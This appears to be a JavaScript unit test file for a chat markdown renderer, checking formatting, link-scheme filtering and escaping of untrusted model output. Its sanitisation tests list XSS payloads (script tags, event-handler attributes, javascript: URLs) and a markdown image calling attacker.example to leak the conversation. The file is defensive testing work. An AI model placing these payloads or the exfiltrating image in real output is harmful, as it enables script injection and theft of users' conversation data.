// Unit tests for sites/main/chat/markdown.js: a model's answer becomes HTML
// that is safe to put on the page.
//   node --test test/markdown.unit.mjs
import test from "node:test";
import assert from "node:assert/strict";
import { render } from "../sites/main/chat/markdown.js";

test("paragraphs, line breaks and the marks inside a line", () => {
  assert.equal(render("Hello there"), "<p>Hello there</p>");
  assert.equal(render("One\nTwo\n\nThree"), "<p>One<br>\nTwo</p><p>Three</p>");
  assert.equal(render("**bold** and *italic* and ~~gone~~ and `code`"), "<p><strong>bold</strong> and <em>italic</em> and <del>gone</del> and <code>code</code></p>");
  assert.equal(render("__bold__ and _italic_"), "<p><strong>bold</strong> and <em>italic</em></p>");
  // Marks inside a word or around spaces are left alone.
  assert.equal(render("snake_case_name and 2 * 3 * 4"), "<p>snake_case_name and 2 * 3 * 4</p>");
  assert.equal(render("a \\*star\\* b"), "<p>a *star* b</p>");
});

test("code keeps what is inside it, and is offered a highlighter", () => {
  assert.equal(render("Use `a < b && **c**` here"), "<p>Use <code>a &lt; b &amp;&amp; **c**</code> here</p>");
  const html = render("```js\nconst a = 1 < 2;\n**not bold**\n```\nafter");
  assert.match(html, /<div class="code"><div class="code-bar"><span>js<\/span><button type="button" class="tiny quiet" data-copy-code>Copy<\/button><\/div><pre><code>const a = 1 &lt; 2;\n\*\*not bold\*\*<\/code><\/pre><\/div><p>after<\/p>/);
  // A highlighter's HTML is used as it is. One that throws is ignored.
  assert.match(render("```js\nlet x\n```", { highlight: (code, lang) => `<b>${lang}:${code}</b>` }), /<pre><code><b>js:let x<\/b><\/code><\/pre>/);
  assert.match(render("```js\nlet x\n```", { highlight: () => { throw new Error("no"); } }), /<pre><code>let x<\/code><\/pre>/);
  // An answer that is still arriving has no closing fence yet.
  assert.match(render("```python\nprint(1)"), /<span>python<\/span>.*<pre><code>print\(1\)<\/code><\/pre>/);
  assert.match(render("~~~\nplain\n~~~"), /<span>code<\/span>.*<pre><code>plain<\/code>/);
});

test("headings start at h3, under the page's own", () => {
  assert.equal(render("# Title\n## Part\n###### Deep"), "<h3>Title</h3><h4>Part</h4><h6>Deep</h6>");
  assert.equal(render("#hashtag"), "<p>#hashtag</p>");
});

test("lists, nested lists and numbered lists", () => {
  assert.equal(render("- one\n- two\n- three"), "<ul><li>one</li><li>two</li><li>three</li></ul>");
  assert.equal(render("1. one\n2. two"), "<ol><li>one</li><li>two</li></ol>");
  assert.equal(render("3. three\n4. four"), '<ol start="3"><li>three</li><li>four</li></ol>');
  assert.equal(render("- fruit\n  - apple\n  - pear\n- veg"), "<ul><li>fruit<ul><li>apple</li><li>pear</li></ul></li><li>veg</li></ul>");
  assert.equal(render("1. first\n   - inside\n2. second"), "<ol><li>first<ul><li>inside</li></ul></li><li>second</li></ol>");
  assert.equal(render("- one\n\n- two"), "<ul><li><p>one</p></li><li><p>two</p></li></ul>");
  assert.equal(render("Intro:\n- one\n- two\n\nAfter"), "<p>Intro:</p><ul><li>one</li><li>two</li></ul><p>After</p>");
  assert.equal(render("* **Bold item**: text"), "<ul><li><strong>Bold item</strong>: text</li></ul>");
  // A year at the start of a line does not start a list in the middle of a paragraph.
  assert.equal(render("It was\n1999. A good year."), "<p>It was<br>\n1999. A good year.</p>");
});

test("quotes, rules and tables", () => {
  assert.equal(render("> quoted\n> more\n\nplain"), "<blockquote><p>quoted<br>\nmore</p></blockquote><p>plain</p>");
  assert.equal(render("above\n\n---\n\nbelow"), "<p>above</p><hr><p>below</p>");
  assert.equal(render("| Name | Qty |\n|:-----|----:|\n| Tea | 2 |\n| Milk | 1 |"),
    '<div class="table-wrap"><table><thead><tr><th>Name</th><th class="right">Qty</th></tr></thead><tbody><tr><td>Tea</td><td class="right">2</td></tr><tr><td>Milk</td><td class="right">1</td></tr></tbody></table></div>');
  assert.equal(render("a | b"), "<p>a | b</p>");
});

test("links: only http, https and mailto become links", () => {
  assert.equal(render("[site](https://example.com/a?b=1&c=2)"), '<p><a href="https://example.com/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer">site</a></p>');
  assert.equal(render("See https://example.com/page."), '<p>See <a href="https://example.com/page" target="_blank" rel="noopener noreferrer">https://example.com/page</a>.</p>');
  assert.equal(render("[**bold** link](http://example.com)"), '<p><a href="http://example.com" target="_blank" rel="noopener noreferrer"><strong>bold</strong> link</a></p>');
  assert.equal(render("[mail](mailto:a@example.com)"), '<p><a href="mailto:a@example.com" target="_blank" rel="noopener noreferrer">mail</a></p>');
  for (const bad of ["javascript:alert(1)", "JaVaScRiPt:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:x", "//example.com", "/local"]) {
    const html = render(`[click](${bad})`);
    assert.ok(!/<a /.test(html), bad + " -> " + html);
  }
});

test("nothing a model writes becomes markup of its own", () => {
  const attacks = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "Hello <b onmouseover=alert(1)>there</b>",
    '[x](https://example.com/"onmouseover="alert(1))',
    "[x](https://example.com/'onmouseover='alert(1))",
    '[<img src=x onerror=alert(1)>](https://example.com)',
    "`<script>alert(1)</script>`",
    "```\n</code></pre><script>alert(1)</script>\n```",
    "```\"><script>alert(1)</script>\ncode\n```",
    "| <script>alert(1)</script> | b |\n|---|---|\n| <img src=x> | d |",
    "# <script>alert(1)</script>",
    "- <iframe src=javascript:alert(1)>",
    "> <svg onload=alert(1)>",
    "\uE0000\uE001 <script>alert(1)</script>",
    "[a](https://example.com) \uE0001\uE001<script>",
  ];
  for (const text of attacks) {
    const html = render(text);
    // The only tags in the output are the ones the renderer writes.
    const tags = [...html.matchAll(/<\/?([a-z0-9]+)([^>]*)>/gi)];
    for (const [whole, name, rest] of tags) {
      assert.ok(["p", "br", "strong", "em", "del", "code", "pre", "div", "span", "button", "a", "ul", "ol", "li", "blockquote", "hr", "table", "thead", "tbody", "tr", "th", "td", "h3", "h4", "h5", "h6"].includes(name.toLowerCase()), `${name} in ${html}`);
      assert.ok(!/\son\w+\s*=/i.test(rest), `handler in ${whole}`);
      if (name.toLowerCase() === "a" && !whole.startsWith("</")) assert.match(whole, /^<a href="(https?:\/\/|mailto:)[^"]*" target="_blank" rel="noopener noreferrer">$/);
    }
    assert.ok(!/<script|<img|<iframe|<svg/i.test(html), html);
  }
});

test("an image is never loaded: it is shown as a link", () => {
  const html = render("![chart](https://attacker.example/log?q=the+conversation)");
  assert.ok(!/<img/i.test(html));
  assert.equal(html, '<p><a href="https://attacker.example/log?q=the+conversation" target="_blank" rel="noopener noreferrer">chart</a></p>');
  assert.equal(render("![](https://example.com/a.png)"), '<p><a href="https://example.com/a.png" target="_blank" rel="noopener noreferrer">image</a></p>');
});

test("odd input does not hang or throw", () => {
  for (const text of ["", "\n\n\n", "```", "- ", "-", "1.", ">", "|", "|||\n|-|", "**", "****", "`", "[](", "![](", "#", "# ", "---", "- a\n   \n   \n", "*".repeat(5000), "[".repeat(3000), "`".repeat(3001), "- ".repeat(2000), null, undefined, 42]) {
    assert.equal(typeof render(text), "string");
  }
  assert.equal(render(null), "");
});
